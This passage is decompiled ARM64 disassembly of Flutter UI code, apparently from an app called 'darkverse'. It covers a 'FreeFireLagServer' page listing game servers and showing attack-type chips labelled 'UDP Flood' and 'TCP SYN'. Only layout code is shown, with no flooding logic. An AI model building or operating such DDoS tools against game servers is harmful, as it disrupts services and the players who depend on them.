    //     0x87651c: stur            w1, [x0, #0x13]
    // 0x876520: r1 = <Widget>
    //     0x876520: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x876524: r0 = AllocateGrowableArray()
    //     0x876524: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x876528: mov             x1, x0
    // 0x87652c: ldur            x0, [fp, #-0x28]
    // 0x876530: stur            x1, [fp, #-0x18]
    // 0x876534: StoreField: r1->field_f = r0
    //     0x876534: stur            w0, [x1, #0xf]
    // 0x876538: r2 = 4
    //     0x876538: mov             x2, #4
    // 0x87653c: StoreField: r1->field_b = r2
    //     0x87653c: stur            w2, [x1, #0xb]
    // 0x876540: r0 = Row()
    //     0x876540: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x876544: mov             x1, x0
    // 0x876548: r0 = Instance_Axis
    //     0x876548: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x87654c: stur            x1, [fp, #-0x28]
    // 0x876550: StoreField: r1->field_f = r0
    //     0x876550: stur            w0, [x1, #0xf]
    // 0x876554: r2 = Instance_MainAxisAlignment
    //     0x876554: add             x2, PP, #0xc, lsl #12  ; [pp+0xcb60] Obj!MainAxisAlignment@a40381
    //     0x876558: ldr             x2, [x2, #0xb60]
    // 0x87655c: StoreField: r1->field_13 = r2
    //     0x87655c: stur            w2, [x1, #0x13]
    // 0x876560: r3 = Instance_MainAxisSize
    //     0x876560: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x876564: ldr             x3, [x3, #0xbc0]
    // 0x876568: ArrayStore: r1[0] = r3  ; List_4
    //     0x876568: stur            w3, [x1, #0x17]
    // 0x87656c: r4 = Instance_CrossAxisAlignment
    //     0x87656c: ldr             x4, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x876570: StoreField: r1->field_1b = r4
    //     0x876570: stur            w4, [x1, #0x1b]
    // 0x876574: r5 = Instance_VerticalDirection
    //     0x876574: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x876578: StoreField: r1->field_23 = r5
    //     0x876578: stur            w5, [x1, #0x23]
    // 0x87657c: r6 = Instance_Clip
    //     0x87657c: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876580: StoreField: r1->field_2b = r6
    //     0x876580: stur            w6, [x1, #0x2b]
    // 0x876584: StoreField: r1->field_2f = rZR
    //     0x876584: stur            xzr, [x1, #0x2f]
    // 0x876588: ldur            x7, [fp, #-0x18]
    // 0x87658c: StoreField: r1->field_b = r7
    //     0x87658c: stur            w7, [x1, #0xb]
    // 0x876590: r7 = LoadStaticField(0xd70)
    //     0x876590: ldr             x7, [THR, #0x78]  ; THR::field_table_values
    //     0x876594: ldr             x7, [x7, #0x1ae0]
    // 0x876598: str             x7, [SP]
    // 0x87659c: r0 = _interpolateSingle()
    //     0x87659c: bl              #0x45c740  ; [dart:core] _StringBase::_interpolateSingle
    // 0x8765a0: stur            x0, [fp, #-0x18]
    // 0x8765a4: r0 = Text()
    //     0x8765a4: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8765a8: mov             x3, x0
    // 0x8765ac: ldur            x0, [fp, #-0x18]
    // 0x8765b0: stur            x3, [fp, #-0x30]
    // 0x8765b4: StoreField: r3->field_b = r0
    //     0x8765b4: stur            w0, [x3, #0xb]
    // 0x8765b8: r0 = Instance_TextStyle
    //     0x8765b8: add             x0, PP, #0x3b, lsl #12  ; [pp+0x3bd88] Obj!TextStyle@a23f31
    //     0x8765bc: ldr             x0, [x0, #0xd88]
    // 0x8765c0: StoreField: r3->field_13 = r0
    //     0x8765c0: stur            w0, [x3, #0x13]
    // 0x8765c4: r1 = Null
    //     0x8765c4: mov             x1, NULL
    // 0x8765c8: r2 = 4
    //     0x8765c8: mov             x2, #4
    // 0x8765cc: r0 = AllocateArray()
    //     0x8765cc: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8765d0: stur            x0, [fp, #-0x18]
    // 0x8765d4: r16 = Instance_Text
    //     0x8765d4: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bd90] Obj!Text@a30231
    //     0x8765d8: ldr             x16, [x16, #0xd90]
    // 0x8765dc: StoreField: r0->field_f = r16
    //     0x8765dc: stur            w16, [x0, #0xf]
    // 0x8765e0: ldur            x1, [fp, #-0x30]
    // 0x8765e4: StoreField: r0->field_13 = r1
    //     0x8765e4: stur            w1, [x0, #0x13]
    // 0x8765e8: r1 = <Widget>
    //     0x8765e8: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8765ec: r0 = AllocateGrowableArray()
    //     0x8765ec: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x8765f0: mov             x1, x0
    // 0x8765f4: ldur            x0, [fp, #-0x18]
    // 0x8765f8: stur            x1, [fp, #-0x30]
    // 0x8765fc: StoreField: r1->field_f = r0
    //     0x8765fc: stur            w0, [x1, #0xf]
    // 0x876600: r2 = 4
    //     0x876600: mov             x2, #4
    // 0x876604: StoreField: r1->field_b = r2
    //     0x876604: stur            w2, [x1, #0xb]
    // 0x876608: r0 = Row()
    //     0x876608: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x87660c: mov             x1, x0
    // 0x876610: r0 = Instance_Axis
    //     0x876610: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x876614: stur            x1, [fp, #-0x18]
    // 0x876618: StoreField: r1->field_f = r0
    //     0x876618: stur            w0, [x1, #0xf]
    // 0x87661c: r2 = Instance_MainAxisAlignment
    //     0x87661c: add             x2, PP, #0xc, lsl #12  ; [pp+0xcb60] Obj!MainAxisAlignment@a40381
    //     0x876620: ldr             x2, [x2, #0xb60]
    // 0x876624: StoreField: r1->field_13 = r2
    //     0x876624: stur            w2, [x1, #0x13]
    // 0x876628: r3 = Instance_MainAxisSize
    //     0x876628: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x87662c: ldr             x3, [x3, #0xbc0]
    // 0x876630: ArrayStore: r1[0] = r3  ; List_4
    //     0x876630: stur            w3, [x1, #0x17]
    // 0x876634: r4 = Instance_CrossAxisAlignment
    //     0x876634: ldr             x4, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x876638: StoreField: r1->field_1b = r4
    //     0x876638: stur            w4, [x1, #0x1b]
    // 0x87663c: r5 = Instance_VerticalDirection
    //     0x87663c: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x876640: StoreField: r1->field_23 = r5
    //     0x876640: stur            w5, [x1, #0x23]
    // 0x876644: r6 = Instance_Clip
    //     0x876644: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876648: StoreField: r1->field_2b = r6
    //     0x876648: stur            w6, [x1, #0x2b]
    // 0x87664c: StoreField: r1->field_2f = rZR
    //     0x87664c: stur            xzr, [x1, #0x2f]
    // 0x876650: ldur            x7, [fp, #-0x30]
    // 0x876654: StoreField: r1->field_b = r7
    //     0x876654: stur            w7, [x1, #0xb]
    // 0x876658: r0 = LoadStaticField(0xd84)
    //     0x876658: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87665c: ldr             x0, [x0, #0x1b08]
    // 0x876660: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x876664: cmp             w0, w16
    // 0x876668: b.ne            #0x876678
    // 0x87666c: r2 = freefireServers
    //     0x87666c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x876670: ldr             x2, [x2, #0xd98]
    // 0x876674: r0 = InitLateFinalStaticField()
    //     0x876674: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x876678: LoadField: r3 = r0->field_b
    //     0x876678: ldur            w3, [x0, #0xb]
    // 0x87667c: stur            x3, [fp, #-0x30]
    // 0x876680: r1 = Null
    //     0x876680: mov             x1, NULL
    // 0x876684: r2 = 4
    //     0x876684: mov             x2, #4
    // 0x876688: r0 = AllocateArray()
    //     0x876688: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87668c: mov             x1, x0
    // 0x876690: ldur            x0, [fp, #-0x30]
    // 0x876694: StoreField: r1->field_f = r0
    //     0x876694: stur            w0, [x1, #0xf]
    // 0x876698: r16 = " Servers"
    //     0x876698: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bda0] " Servers"
    //     0x87669c: ldr             x16, [x16, #0xda0]
    // 0x8766a0: StoreField: r1->field_13 = r16
    //     0x8766a0: stur            w16, [x1, #0x13]
    // 0x8766a4: str             x1, [SP]
    // 0x8766a8: r0 = _interpolate()
    //     0x8766a8: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x8766ac: stur            x0, [fp, #-0x30]
    // 0x8766b0: r0 = Text()
    //     0x8766b0: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8766b4: mov             x3, x0
    // 0x8766b8: ldur            x0, [fp, #-0x30]
    // 0x8766bc: stur            x3, [fp, #-0x40]
    // 0x8766c0: StoreField: r3->field_b = r0
    //     0x8766c0: stur            w0, [x3, #0xb]
    // 0x8766c4: r0 = Instance_TextStyle
    //     0x8766c4: add             x0, PP, #0x3b, lsl #12  ; [pp+0x3bda8] Obj!TextStyle@a23ec1
    //     0x8766c8: ldr             x0, [x0, #0xda8]
    // 0x8766cc: StoreField: r3->field_13 = r0
    //     0x8766cc: stur            w0, [x3, #0x13]
    // 0x8766d0: r1 = Null
    //     0x8766d0: mov             x1, NULL
    // 0x8766d4: r2 = 4
    //     0x8766d4: mov             x2, #4
    // 0x8766d8: r0 = AllocateArray()
    //     0x8766d8: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8766dc: stur            x0, [fp, #-0x30]
    // 0x8766e0: r16 = Instance_Text
    //     0x8766e0: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bdb0] Obj!Text@a301e1
    //     0x8766e4: ldr             x16, [x16, #0xdb0]
    // 0x8766e8: StoreField: r0->field_f = r16
    //     0x8766e8: stur            w16, [x0, #0xf]
    // 0x8766ec: ldur            x1, [fp, #-0x40]
    // 0x8766f0: StoreField: r0->field_13 = r1
    //     0x8766f0: stur            w1, [x0, #0x13]
    // 0x8766f4: r1 = <Widget>
    //     0x8766f4: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8766f8: r0 = AllocateGrowableArray()
    //     0x8766f8: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x8766fc: mov             x1, x0
    // 0x876700: ldur            x0, [fp, #-0x30]
    // 0x876704: stur            x1, [fp, #-0x40]
    // 0x876708: StoreField: r1->field_f = r0
    //     0x876708: stur            w0, [x1, #0xf]
    // 0x87670c: r2 = 4
    //     0x87670c: mov             x2, #4
    // 0x876710: StoreField: r1->field_b = r2
    //     0x876710: stur            w2, [x1, #0xb]
    // 0x876714: r0 = Row()
    //     0x876714: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x876718: mov             x3, x0
    // 0x87671c: r0 = Instance_Axis
    //     0x87671c: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x876720: stur            x3, [fp, #-0x30]
    // 0x876724: StoreField: r3->field_f = r0
    //     0x876724: stur            w0, [x3, #0xf]
    // 0x876728: r1 = Instance_MainAxisAlignment
    //     0x876728: add             x1, PP, #0xc, lsl #12  ; [pp+0xcb60] Obj!MainAxisAlignment@a40381
    //     0x87672c: ldr             x1, [x1, #0xb60]
    // 0x876730: StoreField: r3->field_13 = r1
    //     0x876730: stur            w1, [x3, #0x13]
    // 0x876734: r4 = Instance_MainAxisSize
    //     0x876734: add             x4, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x876738: ldr             x4, [x4, #0xbc0]
    // 0x87673c: ArrayStore: r3[0] = r4  ; List_4
    //     0x87673c: stur            w4, [x3, #0x17]
    // 0x876740: r5 = Instance_CrossAxisAlignment
    //     0x876740: ldr             x5, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x876744: StoreField: r3->field_1b = r5
    //     0x876744: stur            w5, [x3, #0x1b]
    // 0x876748: r6 = Instance_VerticalDirection
    //     0x876748: ldr             x6, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x87674c: StoreField: r3->field_23 = r6
    //     0x87674c: stur            w6, [x3, #0x23]
    // 0x876750: r7 = Instance_Clip
    //     0x876750: ldr             x7, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876754: StoreField: r3->field_2b = r7
    //     0x876754: stur            w7, [x3, #0x2b]
    // 0x876758: StoreField: r3->field_2f = rZR
    //     0x876758: stur            xzr, [x3, #0x2f]
    // 0x87675c: ldur            x1, [fp, #-0x40]
    // 0x876760: StoreField: r3->field_b = r1
    //     0x876760: stur            w1, [x3, #0xb]
    // 0x876764: r1 = Null
    //     0x876764: mov             x1, NULL
    // 0x876768: r2 = 10
    //     0x876768: mov             x2, #0xa
    // 0x87676c: r0 = AllocateArray()
    //     0x87676c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x876770: mov             x2, x0
    // 0x876774: ldur            x0, [fp, #-0x28]
    // 0x876778: stur            x2, [fp, #-0x40]
    // 0x87677c: StoreField: r2->field_f = r0
    //     0x87677c: stur            w0, [x2, #0xf]
    // 0x876780: r16 = Instance_SizedBox
    //     0x876780: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x876784: ldr             x16, [x16, #0x50]
    // 0x876788: StoreField: r2->field_13 = r16
    //     0x876788: stur            w16, [x2, #0x13]
    // 0x87678c: ldur            x0, [fp, #-0x18]
    // 0x876790: ArrayStore: r2[0] = r0  ; List_4
    //     0x876790: stur            w0, [x2, #0x17]
    // 0x876794: r16 = Instance_SizedBox
    //     0x876794: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x876798: ldr             x16, [x16, #0x50]
    // 0x87679c: StoreField: r2->field_1b = r16
    //     0x87679c: stur            w16, [x2, #0x1b]
    // 0x8767a0: ldur            x0, [fp, #-0x30]
    // 0x8767a4: StoreField: r2->field_1f = r0
    //     0x8767a4: stur            w0, [x2, #0x1f]
    // 0x8767a8: r1 = <Widget>
    //     0x8767a8: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8767ac: r0 = AllocateGrowableArray()
    //     0x8767ac: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x8767b0: mov             x1, x0
    // 0x8767b4: ldur            x0, [fp, #-0x40]
    // 0x8767b8: stur            x1, [fp, #-0x18]
    // 0x8767bc: StoreField: r1->field_f = r0
    //     0x8767bc: stur            w0, [x1, #0xf]
    // 0x8767c0: r2 = 10
    //     0x8767c0: mov             x2, #0xa
    // 0x8767c4: StoreField: r1->field_b = r2
    //     0x8767c4: stur            w2, [x1, #0xb]
    // 0x8767c8: r0 = Column()
    //     0x8767c8: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x8767cc: mov             x1, x0
    // 0x8767d0: r0 = Instance_Axis
    //     0x8767d0: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x8767d4: stur            x1, [fp, #-0x28]
    // 0x8767d8: StoreField: r1->field_f = r0
    //     0x8767d8: stur            w0, [x1, #0xf]
    // 0x8767dc: r2 = Instance_MainAxisAlignment
    //     0x8767dc: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x8767e0: StoreField: r1->field_13 = r2
    //     0x8767e0: stur            w2, [x1, #0x13]
    // 0x8767e4: r3 = Instance_MainAxisSize
    //     0x8767e4: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x8767e8: ldr             x3, [x3, #0xbc0]
    // 0x8767ec: ArrayStore: r1[0] = r3  ; List_4
    //     0x8767ec: stur            w3, [x1, #0x17]
    // 0x8767f0: r4 = Instance_CrossAxisAlignment
    //     0x8767f0: ldr             x4, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x8767f4: StoreField: r1->field_1b = r4
    //     0x8767f4: stur            w4, [x1, #0x1b]
    // 0x8767f8: r5 = Instance_VerticalDirection
    //     0x8767f8: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x8767fc: StoreField: r1->field_23 = r5
    //     0x8767fc: stur            w5, [x1, #0x23]
    // 0x876800: r6 = Instance_Clip
    //     0x876800: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x876804: StoreField: r1->field_2b = r6
    //     0x876804: stur            w6, [x1, #0x2b]
    // 0x876808: StoreField: r1->field_2f = rZR
    //     0x876808: stur            xzr, [x1, #0x2f]
    // 0x87680c: ldur            x7, [fp, #-0x18]
    // 0x876810: StoreField: r1->field_b = r7
    //     0x876810: stur            w7, [x1, #0xb]
    // 0x876814: r0 = Container()
    //     0x876814: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x876818: stur            x0, [fp, #-0x18]
    // 0x87681c: r16 = Instance_EdgeInsets
    //     0x87681c: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3b3b8] Obj!EdgeInsets@a08991
    //     0x876820: ldr             x16, [x16, #0x3b8]
    // 0x876824: ldur            lr, [fp, #-0x38]
    // 0x876828: stp             lr, x16, [SP, #8]
    // 0x87682c: ldur            x16, [fp, #-0x28]
    // 0x876830: str             x16, [SP]
    // 0x876834: mov             x1, x0
    // 0x876838: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x876838: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x87683c: ldr             x4, [x4, #0xe58]
    // 0x876840: r0 = Container()
    //     0x876840: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x876844: r0 = GlassBlur()
    //     0x876844: bl              #0x6bce18  ; AllocateGlassBlurStub -> GlassBlur (size=0x20)
    // 0x876848: d0 = 15.000000
    //     0x876848: fmov            d0, #15.00000000
    // 0x87684c: stur            x0, [fp, #-0x28]
    // 0x876850: StoreField: r0->field_b = d0
    //     0x876850: stur            d0, [x0, #0xb]
    // 0x876854: ldur            x1, [fp, #-0x18]
    // 0x876858: StoreField: r0->field_1b = r1
    //     0x876858: stur            w1, [x0, #0x1b]
    // 0x87685c: d1 = 10.000000
    //     0x87685c: fmov            d1, #10.00000000
    // 0x876860: StoreField: r0->field_13 = d1
    //     0x876860: stur            d1, [x0, #0x13]
    // 0x876864: r0 = Color()
    //     0x876864: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876868: mov             x1, x0
    // 0x87686c: r0 = Instance_ColorSpace
    //     0x87686c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876870: stur            x1, [fp, #-0x18]
    // 0x876874: StoreField: r1->field_27 = r0
    //     0x876874: stur            w0, [x1, #0x27]
    // 0x876878: d0 = 0.101961
    //     0x876878: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x87687c: StoreField: r1->field_7 = d0
    //     0x87687c: stur            d0, [x1, #7]
    // 0x876880: d0 = 0.992157
    //     0x876880: ldr             d0, [PP, #0x6f38]  ; [pp+0x6f38] IMM: double(0.9921568627450981) from 0x3fefbfbfbfbfbfc0
    // 0x876884: StoreField: r1->field_f = d0
    //     0x876884: stur            d0, [x1, #0xf]
    // 0x876888: d1 = 0.619608
    //     0x876888: ldr             d1, [PP, #0x6f40]  ; [pp+0x6f40] IMM: double(0.6196078431372549) from 0x3fe3d3d3d3d3d3d4
    // 0x87688c: ArrayStore: r1[0] = d1  ; List_8
    //     0x87688c: stur            d1, [x1, #0x17]
    // 0x876890: StoreField: r1->field_1f = d1
    //     0x876890: stur            d1, [x1, #0x1f]
    // 0x876894: r0 = Radius()
    //     0x876894: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x876898: d0 = 15.000000
    //     0x876898: fmov            d0, #15.00000000
    // 0x87689c: stur            x0, [fp, #-0x30]
    // 0x8768a0: StoreField: r0->field_7 = d0
    //     0x8768a0: stur            d0, [x0, #7]
    // 0x8768a4: StoreField: r0->field_f = d0
    //     0x8768a4: stur            d0, [x0, #0xf]
    // 0x8768a8: r0 = BorderRadius()
    //     0x8768a8: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x8768ac: mov             x1, x0
    // 0x8768b0: ldur            x0, [fp, #-0x30]
    // 0x8768b4: stur            x1, [fp, #-0x38]
    // 0x8768b8: StoreField: r1->field_7 = r0
    //     0x8768b8: stur            w0, [x1, #7]
    // 0x8768bc: StoreField: r1->field_b = r0
    //     0x8768bc: stur            w0, [x1, #0xb]
    // 0x8768c0: StoreField: r1->field_f = r0
    //     0x8768c0: stur            w0, [x1, #0xf]
    // 0x8768c4: StoreField: r1->field_13 = r0
    //     0x8768c4: stur            w0, [x1, #0x13]
    // 0x8768c8: r0 = Color()
    //     0x8768c8: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8768cc: mov             x1, x0
    // 0x8768d0: r0 = Instance_ColorSpace
    //     0x8768d0: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8768d4: StoreField: r1->field_27 = r0
    //     0x8768d4: stur            w0, [x1, #0x27]
    // 0x8768d8: d1 = 0.760784
    //     0x8768d8: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x8768dc: ldr             d1, [x17, #0xc40]
    // 0x8768e0: StoreField: r1->field_7 = d1
    //     0x8768e0: stur            d1, [x1, #7]
    // 0x8768e4: d2 = 0.956863
    //     0x8768e4: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x8768e8: ldr             d2, [x17, #0xec8]
    // 0x8768ec: StoreField: r1->field_f = d2
    //     0x8768ec: stur            d2, [x1, #0xf]
    // 0x8768f0: ArrayStore: r1[0] = d2  ; List_8
    //     0x8768f0: stur            d2, [x1, #0x17]
    // 0x8768f4: StoreField: r1->field_1f = d2
    //     0x8768f4: stur            d2, [x1, #0x1f]
    // 0x8768f8: d0 = 0.300000
    //     0x8768f8: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x8768fc: ldr             d0, [x17, #0x180]
    // 0x876900: r0 = withOpacity()
    //     0x876900: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x876904: str             x0, [SP]
    // 0x876908: r1 = Null
    //     0x876908: mov             x1, NULL
    // 0x87690c: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x87690c: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x876910: ldr             x4, [x4, #0xc68]
    // 0x876914: r0 = Border.all()
    //     0x876914: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x876918: stur            x0, [fp, #-0x30]
    // 0x87691c: r0 = BoxDecoration()
    //     0x87691c: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x876920: mov             x1, x0
    // 0x876924: ldur            x0, [fp, #-0x18]
    // 0x876928: stur            x1, [fp, #-0x40]
    // 0x87692c: StoreField: r1->field_7 = r0
    //     0x87692c: stur            w0, [x1, #7]
    // 0x876930: ldur            x0, [fp, #-0x30]
    // 0x876934: StoreField: r1->field_f = r0
    //     0x876934: stur            w0, [x1, #0xf]
    // 0x876938: ldur            x0, [fp, #-0x38]
    // 0x87693c: StoreField: r1->field_13 = r0
    //     0x87693c: stur            w0, [x1, #0x13]
    // 0x876940: r0 = Instance_BoxShape
    //     0x876940: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x876944: ldr             x0, [x0, #0xd78]
    // 0x876948: StoreField: r1->field_23 = r0
    //     0x876948: stur            w0, [x1, #0x23]
    // 0x87694c: ldur            x2, [fp, #-8]
    // 0x876950: LoadField: r3 = r2->field_f
    //     0x876950: ldur            w3, [x2, #0xf]
    // 0x876954: DecompressPointer r3
    //     0x876954: add             x3, x3, HEAP, lsl #32
    // 0x876958: stur            x3, [fp, #-0x18]
    // 0x87695c: r0 = Color()
    //     0x87695c: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876960: mov             x1, x0
    // 0x876964: r0 = Instance_ColorSpace
    //     0x876964: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876968: StoreField: r1->field_27 = r0
    //     0x876968: stur            w0, [x1, #0x27]
    // 0x87696c: d0 = 0.760784
    //     0x87696c: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876970: ldr             d0, [x17, #0xc40]
    // 0x876974: StoreField: r1->field_7 = d0
    //     0x876974: stur            d0, [x1, #7]
    // 0x876978: d1 = 0.956863
    //     0x876978: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x87697c: ldr             d1, [x17, #0xec8]
    // 0x876980: StoreField: r1->field_f = d1
    //     0x876980: stur            d1, [x1, #0xf]
    // 0x876984: ArrayStore: r1[0] = d1  ; List_8
    //     0x876984: stur            d1, [x1, #0x17]
    // 0x876988: StoreField: r1->field_1f = d1
    //     0x876988: stur            d1, [x1, #0x1f]
    // 0x87698c: mov             x3, x1
    // 0x876990: ldur            x1, [fp, #-0x18]
    // 0x876994: r2 = "UDP Flood"
    //     0x876994: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdb8] "UDP Flood"
    //     0x876998: ldr             x2, [x2, #0xdb8]
    // 0x87699c: r0 = _buildChip()
    //     0x87699c: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x8769a0: mov             x1, x0
    // 0x8769a4: ldur            x0, [fp, #-8]
    // 0x8769a8: stur            x1, [fp, #-0x30]
    // 0x8769ac: LoadField: r2 = r0->field_f
    //     0x8769ac: ldur            w2, [x0, #0xf]
    // 0x8769b0: DecompressPointer r2
    //     0x8769b0: add             x2, x2, HEAP, lsl #32
    // 0x8769b4: stur            x2, [fp, #-0x18]
    // 0x8769b8: r0 = Color()
    //     0x8769b8: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8769bc: mov             x1, x0
    // 0x8769c0: r0 = Instance_ColorSpace
    //     0x8769c0: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8769c4: StoreField: r1->field_27 = r0
    //     0x8769c4: stur            w0, [x1, #0x27]
    // 0x8769c8: d0 = 0.760784
    //     0x8769c8: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x8769cc: ldr             d0, [x17, #0xc40]
    // 0x8769d0: StoreField: r1->field_7 = d0
    //     0x8769d0: stur            d0, [x1, #7]
    // 0x8769d4: d1 = 0.956863
    //     0x8769d4: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x8769d8: ldr             d1, [x17, #0xec8]
    // 0x8769dc: StoreField: r1->field_f = d1
    //     0x8769dc: stur            d1, [x1, #0xf]
    // 0x8769e0: ArrayStore: r1[0] = d1  ; List_8
    //     0x8769e0: stur            d1, [x1, #0x17]
    // 0x8769e4: StoreField: r1->field_1f = d1
    //     0x8769e4: stur            d1, [x1, #0x1f]
    // 0x8769e8: mov             x3, x1
    // 0x8769ec: ldur            x1, [fp, #-0x18]
    // 0x8769f0: r2 = "TCP SYN"
    //     0x8769f0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bdc0] "TCP SYN"
    //     0x8769f4: ldr             x2, [x2, #0xdc0]
    // 0x8769f8: r0 = _buildChip()
    //     0x8769f8: bl              #0x8778c8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_buildChip
    // 0x8769fc: mov             x1, x0
    // 0x876a00: ldur            x0, [fp, #-8]
    // 0x876a04: stur            x1, [fp, #-0x38]
    // 0x876a08: LoadField: r2 = r0->field_f
    //     0x876a08: ldur            w2, [x0, #0xf]
    // 0x876a0c: DecompressPointer r2
    //     0x876a0c: add             x2, x2, HEAP, lsl #32
    // 0x876a10: stur            x2, [fp, #-0x18]
    // 0x876a14: r0 = Color()
